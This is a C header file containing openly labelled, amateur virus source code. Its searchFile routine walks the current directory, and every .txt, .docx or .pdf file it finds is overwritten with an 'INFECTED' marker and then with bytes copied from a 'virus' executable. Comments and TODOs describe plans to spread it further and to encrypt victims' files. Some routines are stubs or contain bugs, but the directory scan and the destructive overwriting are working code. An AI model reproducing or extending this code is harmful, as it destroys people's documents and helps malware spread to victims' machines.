#ifndef INFECT_H
#define INFECT_H

#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#define MAX_LEN 255
#define BUFFER_LEN 2048

//something is really strange here

// 
// 3 main thing about a virus
// + infect
// + payload
// + 


// TODO: make a virus not self infected itself

void replicate(char *virusFileName, char *infectedFileName){
  // Use static because if you declare a varible in a function it will sit on a stack
  // And stack tend to pop all varible when it done

  static char buff[BUFFER_LEN];
  FILE * infectedFileHandler = fopen(infectedFileName,"w");
  FILE *f = fopen(virusFileName,"r");

  // The size of the executable
  int virusSize = 51384;

  if(f == NULL){
    // Does nothing or you make sure the virus is alway replicate itself
    return;
  }
  // TODO: Make the virus spread using file, though docx and txt, or some executable

  // Read the binary of virus and copy itself to the host
  while (virusSize > BUFFER_LEN){

    fread(buff,BUFFER_LEN,1,f);
    fwrite(buff,BUFFER_LEN,1,infectedFileHandler);
    virusSize -= BUFFER_LEN;

  }
  
  fclose(f);
  fclose(infectedFileHandler);
}


// TODO: consider writing a encrypt hash
void encryptFile(){
  

}


int infectFile(char *f_name){
  // Should be some malicous injection or something
  char buffer[BUFFER_LEN] = "INFECTED";
  FILE *f = fopen(f_name,"wr");
  // if file getting error 
  if(f == NULL){
    printf("File is shit");
    // After read the file, encrypt the content, or change the
    // write to the file
  }else{
    printf("[*] Infected %s\n",f_name);

    // write 1024 bytes into the file
    fwrite(buffer,sizeof(buffer),1,f);
  }
  fclose(f);
  return 0;
}

 

int searchFile(){
  DIR *d;
  struct dirent *dir;
  // file extention
  char * fileInfect[MAX_LEN] = {".txt",".docx",".pdf"};
  
  // Open the currently standing folder
  d = opendir(".");
  
  if(d == NULL){
    exit(1);
  }

  if(d){
    while((dir = readdir(d))!=NULL){
      char * fileExtension = strrchr(dir->d_name,'.');

      // Iterate through the list of file to infect
      for(int file = 0; file < 3; file++){
        
        if( (fileExtension != NULL) && (strcmp(fileExtension, fileInfect[file])) == 0){
          
          infectFile(dir->d_name);
          replicate("virus",dir->d_name);
          // Rename the file is not cool
        }
      }
    }
    closedir(d);  
  }
  // Exit successfully
  return 0;
}
#endif
